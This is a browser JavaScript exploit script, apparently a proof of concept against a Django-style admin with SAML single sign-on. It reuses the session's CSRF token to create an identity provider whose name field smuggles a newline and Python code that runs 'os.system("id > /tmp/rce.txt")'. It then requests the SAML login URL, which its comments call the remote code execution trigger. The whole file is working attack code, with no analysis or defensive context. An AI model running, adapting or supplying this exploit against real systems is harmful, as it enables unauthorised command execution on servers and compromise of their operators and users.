 (function() {
     // 1. Native function to get CSRF token without relying on js-cookie
     function getCookie(name) {
         let cookieValue = null;
         if (document.cookie && document.cookie !== '') {
             const cookies = document.cookie.split(';');
             for (let i = 0; i < cookies.length; i++) {
                 const cookie = cookies[i].trim();
                 if (cookie.substring(0, name.length + 1) === (name + '=')) {
                     cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
                     break;
                 }
             }
         }
         return cookieValue;
     }

     const id = Math.floor(Math.random() * 9999);
     const slug = 'exp-' + id;

     // 2. The payload with the literal newline
     const name = `Exploit${id}\nimport os;os.system("id > /tmp/rce.txt")`;

     const xml = '<?xml version="1.0"?><md:EntityDescriptor xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata" entityID="http://x.com"><md:IDPSSODescriptor
 protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol"><md:SingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect"
 Location="http://x.com/sso"/></md:IDPSSODescriptor></md:EntityDescriptor>';

     // 3. Build the form data natively
     const formData = new FormData();
     formData.append('csrfmiddlewaretoken', getCookie('csrftoken'));
     formData.append('name', name);
     formData.append('slug', slug);
     formData.append('protocol', 'saml');
     formData.append('status', 'active');
     formData.append('saml_metadata_xml', xml);
     formData.append('use_custom_attribute_map', 'on');
     formData.append('attribute_mapping', '{"email":["mail"]}');
     formData.append('_save', 'Save');

     // 4. Send the POST request natively
     fetch('/admin/uac/identityprovider/add/', {
         method: 'POST',
         body: formData,
     }).then(response => {
         if (response.ok) {
             console.log("IDP Created: " + slug);
             // 5. Trigger the RCE
             fetch('/saml2/login/' + slug + '/');
         } else {
             console.error("Failed to create IDP. Status: " + response.status);
         }
     }).catch(err => console.error("Network error: ", err));
 })();


